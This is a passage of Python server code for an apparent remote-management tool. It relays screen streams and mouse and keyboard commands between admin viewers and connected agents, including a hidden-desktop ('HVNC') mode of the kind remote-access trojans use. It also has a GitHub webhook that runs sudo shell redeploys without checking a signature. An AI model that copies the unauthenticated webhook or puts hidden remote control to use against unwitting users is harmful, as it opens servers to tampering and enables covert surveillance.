                    for v_sess in list(agent.viewers.values()) + list(agent.mirror_viewers.values()):
                        v_sess.push_text(raw_text)

    except (WebSocketDisconnect, RuntimeError):
        logger.info(f"Agent {agent_id} disconnected.")
    except Exception as e:
        logger.debug(f"Agent {agent_id} tunnel closed: {e}")
    finally:
        if registered:
            agent_mgr.unregister_connection(agent_id, websocket)
            await broadcast_agent_list()


# -------------------------------------------------------------
# WebSocket: Admin Remote Viewer (HVNC or Screen Mirror)
# -------------------------------------------------------------
@app.websocket("/ws/viewer/{agent_id}")
async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
    token = websocket.cookies.get("trmm_session") or websocket.query_params.get("token")
    if not AuthManager.is_setup_required() and not AuthManager.validate_session(token):
        await websocket.close(code=4001, reason="Unauthorized")
        return
    await websocket.accept()
    mode = websocket.query_params.get("mode", "backstage").lower()
    viewer_id = str(uuid.uuid4())[:8]

    agent = agent_mgr.get_agent(agent_id)
    if not agent:
        await websocket.send_text(json.dumps({"type": "error", "message": "Agent is currently offline"}))
        await websocket.close()
        return

    mirror_ack = (int(websocket.query_params.get("mirror_ack")) if mode == "mirror"
                  and websocket.query_params.get("mirror_ack") in ("1", "2") else 0)
    v_session = agent_mgr.attach_viewer(agent_id, viewer_id, websocket, mode=mode, mirror_ack=mirror_ack)
    if not v_session:
        await websocket.close()
        return

    # Dedicated single-writer loop for this viewer WebSocket (eliminates ASGI write collisions)
    async def _sender_loop():
        while True:
            try:
                item, is_bytes = await v_session.queue.get()
                if is_bytes:
                    if v_session.mirror_diagnostics:
                        mirror_send_started = time.perf_counter()
                        logger.info("[MIRROR RELAY START] t=%.3f viewer=%s bytes=%d queued=%d",
                                    time.time(), viewer_id, len(item), v_session.queue.qsize())
                    await websocket.send_bytes(item)
                    if v_session.mirror_diagnostics:
                        logger.info("[MIRROR RELAY END] t=%.3f viewer=%s bytes=%d send_ms=%.1f",
                                    time.time(), viewer_id, len(item),
                                    (time.perf_counter() - mirror_send_started) * 1000)
                else:
                    await websocket.send_text(item)
                v_session.queue.task_done()
            except Exception:
                break

    v_session.sender_task = asyncio.create_task(v_session.run_sender() if mirror_ack else _sender_loop())

    # Tell the agent to start appropriate stream (Mirror vs HVNC Backstage)
    try:
        if mode == "mirror":
            await agent.send_text_safe(json.dumps({"type": "start_mirror", "transport": 2,
                "preview": all(getattr(v, "protocol_version", 0) == 2 for v in agent.mirror_viewers.values())}))
            agent.is_streaming_mirror = True
        else:
            await agent.send_text_safe(json.dumps({"type": "start_hvnc"}))
            agent.is_streaming_hvnc = True
        await broadcast_agent_list()
    except Exception as e:
        logger.error(f"Failed to signal agent to start {mode} stream: {e}")

    try:
        while True:
            # Forward mouse/keyboard and launch commands from admin browser to the target agent
            data = await websocket.receive_text()
            try:
                msg_obj = json.loads(data)
                if mirror_ack and isinstance(msg_obj, dict) and msg_obj.get("type") == "mirror_frame_ack":
                    if mirror_ack == 2:
                        delivery_ms = v_session.acknowledge(msg_obj.get("sequence"), msg_obj.get("decoded", True) is not False)
                        if delivery_ms is not None and len(agent.mirror_viewers) == 1:
                            await agent.send_text_safe(json.dumps({"type": "mirror_feedback", "delivery_ms": delivery_ms}))
                    else:
                        v_session.acknowledge(msg_obj.get("sequence"))
                    continue
                if mirror_ack == 2 and isinstance(msg_obj, dict) and msg_obj.get("type") == "mirror_refresh":
                    v_session.refresh()
                    await agent.send_text_safe(json.dumps({"type": "mirror_refresh"}))
                    continue
                if isinstance(msg_obj, dict) and "mode" not in msg_obj:
                    msg_obj["mode"] = mode
                    if "data" in msg_obj and isinstance(msg_obj["data"], dict) and "mode" not in msg_obj["data"]:
                        msg_obj["data"]["mode"] = mode
                    data = json.dumps(msg_obj)
            except Exception:
                pass
            
            # Safely forward command to target agent without crashing viewer session
            await agent.send_text_safe(data)
    except (WebSocketDisconnect, RuntimeError):
        pass
    except Exception:
        pass
    finally:
        agent_mgr.detach_viewer(agent_id, viewer_id, mode=mode)
        # If no viewers remain for this mode, tell agent to stop stream to save CPU
        if mode == "mirror":
            if not agent.mirror_viewers:
                agent.is_streaming_mirror = False
                await agent.send_text_safe(json.dumps({"type": "stop_mirror"}))
                await broadcast_agent_list()
            else:
                await agent.send_text_safe(json.dumps({"type": "start_mirror", "transport": 2,
                    "preview": all(getattr(v, "protocol_version", 0) == 2 for v in agent.mirror_viewers.values())}))
        else:
            if not agent.viewers:
                agent.is_streaming_hvnc = False
                await agent.send_text_safe(json.dumps({"type": "stop_hvnc"}))
                await broadcast_agent_list()


# -------------------------------------------------------------
# GitHub Webhook Auto-Deployment Endpoint
# -------------------------------------------------------------
@app.post("/api/webhook/github")
async def github_webhook(request: Request):
    """
    Receives push event from GitHub, pulls latest changes into /opt/trmm,
    and restarts trmm.service so changes take effect live instantly.
    """
    event = request.headers.get("X-GitHub-Event", "ping")
    if event == "ping":
        logger.info("[GitHub Webhook] Received ping event.")
        return {"status": "pong"}

    if event == "push":
        logger.info("[GitHub Webhook] Received push event. Triggering automated deployment...")

        def run_update():
            time.sleep(1)
            cmd = "cd /opt/trmm && git fetch --all && git reset --hard origin/main && sudo systemctl restart trmm"
            res = subprocess.run(["bash", "-c", cmd], capture_output=True, text=True)
            logger.info(f"[GitHub Webhook] Deploy output: {res.stdout}, errors: {res.stderr}")

        threading.Thread(target=run_update, daemon=True).start()
        return {"status": "deployment_triggered"}

    return {"status": "ignored", "event": event}
